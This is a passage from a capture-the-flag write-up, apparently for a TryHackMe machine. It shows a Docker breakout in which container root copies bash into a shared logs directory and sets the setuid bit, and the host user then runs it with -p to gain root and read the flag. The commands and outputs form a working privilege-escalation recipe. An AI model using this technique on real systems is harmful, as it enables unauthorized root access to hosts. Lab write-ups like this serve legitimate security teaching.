dr-xr-xr-x 176 root root    0 Jan 26 16:32 proc
drwx------   1 root root 4096 Dec 21  2022 root
drwxr-xr-x   3 root root 4096 Dec 19  2022 run
drwxr-xr-x   2 root root 4096 Dec 19  2022 sbin
drwxr-xr-x   2 root root 4096 Dec 19  2022 srv
dr-xr-xr-x  13 root root    0 Jan 26 16:32 sys
drwxrwxrwt   1 root root 4096 Dec 21  2022 tmp
drwxr-xr-x   1 root root 4096 Dec 19  2022 usr
drwxr-xr-x   1 root root 4096 Dec 19  2022 var

(remote) root@de0610f51845:/# ls logs/
tt.log
```

## Docker-privesc

So we have shell access to claire-r on the host machine & also root on the container. How can we privesc  & gain a shell as root on the host machine?

The below post by [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells)

Also give this one a read: [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

So in our case, from the root user of the container we can copy the **/bin/bash** binary to the **/logs/** directory & make it a **setuid binary**.

```bash
(remote) root@de0610f51845:/# cp /bin/bash /logs/ && chmod +xs /logs/bash 

(remote) root@de0610f51845:/# ls -al logs/
total 1220
drwxrw-rw- 2 1001 1001    4096 Jan 26 17:01 .
drwxr-xr-x 1 root root    4096 Dec 22  2022 ..
-rwsr-sr-x 1 root root 1234376 Jan 26 17:01 bash
-rw-r--r-- 1 root root     359 Jan 26 16:43 tt.log
```

Now we can switch back to claire-r's shell & run the bash binary present in  `~/timeTracker-src/logs/` directory to get a shell as **root** on the host machine.

Grab the `root.txt` 🚩 
```bash
claire-r@ctf:~/timeTracker-src/logs$ ./bash -p
bash-5.1# id
uid=1001(claire-r) gid=1001(claire-r) euid=0(root) egid=0(root) groups=0(root),1001(claire-r)
bash-5.1# cat /root/root.txt 
THM{1e15f****************************ab2}
```
